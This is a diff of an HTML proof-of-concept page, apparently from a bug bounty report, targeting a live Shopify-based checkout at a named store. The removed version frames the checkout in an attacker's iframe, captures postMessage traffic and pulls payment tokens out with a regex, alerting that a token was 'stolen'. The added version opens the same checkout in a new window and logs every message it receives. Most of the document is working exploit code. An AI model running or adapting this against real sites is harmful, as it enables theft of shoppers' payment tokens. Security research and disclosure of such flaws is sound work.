@@ -1,72 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Shopify postMessage Token Interception PoC</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f6f9; }
-        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        h1 { color: #d9534f; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        .alert-box { background-color: #d9534f; color: white; padding: 15px; border-radius: 5px; font-weight: bold; margin-bottom: 20px; display: none; }
-        .log-box { background: #222; color: #00ff00; padding: 15px; font-family: monospace; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; height: 200px; margin-bottom: 20px; }
-        iframe { width: 100%; height: 600px; border: 2px dashed #ccc; border-radius: 5px; }
-    </style>
+<meta charset="UTF-8">
+<title>postMessage Tester</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    margin: 20px;
+}
+#logs {
+    white-space: pre-wrap;
+    background: #111;
+    color: #0f0;
+    padding: 10px;
+    height: 500px;
+    overflow-y: auto;
+}
+</style>
 </head>
 <body>
 
-<div class="container">
-    <h1>[PoC] Lintas-Asal (Cross-Origin) Token Pembayaran via Iframe</h1>
-    <p>Skrip ini menangkap pesan tokenisasi sensitif akibat target origin wildcard (<code>*</code>) saat checkout dimuat di konteks asing.</p>
-    
-    <div id="statusAlert" class="alert-box">🚨 CRITICAL DATA LEAKAGE: TOKEN PEMBAYARAN "WEST-" BERHASIL DICURI!</div>
-    
-    <h3>Live Interception Logs:</h3>
-    <pre id="logConsole" class="log-box">Menunggu interaksi pembayaran di dalam iframe bawah... [Ketik nomor kartu dan klik Pay Now]</pre>
+<h2>PostMessage Listener</h2>
 
-    <h3>Target Application (Victim View):</h3>
-    <!-- Memuat halaman checkout secara langsung di dalam iframe milik penyerang -->
-    <iframe src="https://shop.flexport.com/checkouts/cn/hWNDiWX0JK8WP3AseizxhoEU/en-id?_r=AQABC9qbdUROh9V9LlDs0jZFh6GUrcCnILJplo8wa_VbmoM&_su_rec=HW7-obz0wtTc59mbrxBMZwSuq0SlFh870OVmPeJ2EXbTu1UOUZQAI0XJTdtQDopnHYJ-vYey1fFzJ7DEKB5sDfvE9iwqK38pn5XHEUNldL6ipiIRVs1VmmiOZkeeUVlMERMgLIYPULJZslj2_zFDLV7Gz7cFbpPwGQMZ3N2e1wHSdAioMS1ehZII8WYY0UEqxcWyZa3xi8KawHoWtbGZhZI&auto_redirect=false&edge_redirect=true&skip_shop_pay=true"></iframe>
-</div>
+<button id="openBtn">Open Checkout</button>
+
+<div id="logs"></div>
 
 <script>
-    const logBox = document.getElementById("logConsole");
-    const statusAlert = document.getElementById("statusAlert");
+const logs = document.getElementById("logs");
 
-    function appendLog(origin, rawData) {
-        if (logBox.textContent.includes("Menunggu interaksi")) {
-            logBox.textContent = "";
-        }
-        const timestamp = new Date().toLocaleTimeString();
-        logBox.textContent += `[${timestamp}] FROM: ${origin}\n[DATA]: ${rawData}\n`;
-        logBox.textContent += `--------------------------------------------------\n`;
-        logBox.scrollTop = logBox.scrollHeight;
+function log(msg) {
+    logs.textContent += msg + "\n";
+}
+
+document.getElementById("openBtn").onclick = () => {
+    window.open(
+        "https://shop.flexport.com/checkouts/cn/hWNDiWX0JK8WP3AseizxhoEU/en-id?_r=AQABC9qbdUROh9V9LlDs0jZFh6GUrcCnILJplo8wa_VbmoM&_su_rec=HW7-obz0wtTc59mbrxBMZwSuq0SlFh870OVmPeJ2EXbTu1UOUZQAI0XJTdtQDopnHYJ-vYey1fFzJ7DEKB5sDfvE9iwqK38pn5XHEUNldL6ipiIRVs1VmmiOZkeeUVlMERMgLIYPULJZslj2_zFDLV7Gz7cFbpPwGQMZ3N2e1wHSdAioMS1ehZII8WYY0UEqxcWyZa3xi8KawHoWtbGZhZI&auto_redirect=false&edge_redirect=true&skip_shop_pay=true",
+        "_blank"
+    );
+
+    log("[+] Checkout opened");
+};
+
+window.addEventListener("message", (e) => {
+
+    log("================================");
+    log("ORIGIN: " + e.origin);
+
+    try {
+        log("DATA: " + JSON.stringify(e.data, null, 2));
+    } catch {
+        log("DATA: " + String(e.data));
     }
 
-    // Mendengarkan seluruh postMessage yang bocor keluar dari iframe ke parent window
-    window.addEventListener("message", function(event) {
-        let rawDataString = "";
-        
-        if (typeof event.data === "string") {
-            rawDataString = event.data;
-        } else if (typeof event.data === "object" && event.data !== null) {
-            rawDataString = JSON.stringify(event.data);
-        }
-
-        if (!rawDataString || rawDataString === "{}") return;
-
-        // Tampilkan semua data yang bocor ke log layar
-        appendLog(event.origin, rawDataString);
-
-        // Validasi utama: Tangkap token "west-" saat tombol Pay Now ditekan
-        if (rawDataString.includes('"action":"token"') && rawDataString.includes('"token":"west-')) {
-            statusAlert.style.display = "block";
-            
-            const matchToken = rawDataString.match(/"token":"(west-[^"]+)"/);
-            const tokenValue = matchToken ? matchToken[1] : "west-extracted";
-            
-            alert(`[HackerOne Bug Bounty]\n\nSukses Mencuri Token Pembayaran!\nToken: ${tokenValue}`);
-        }
-    }, false);
+});
 </script>
 
 </body>
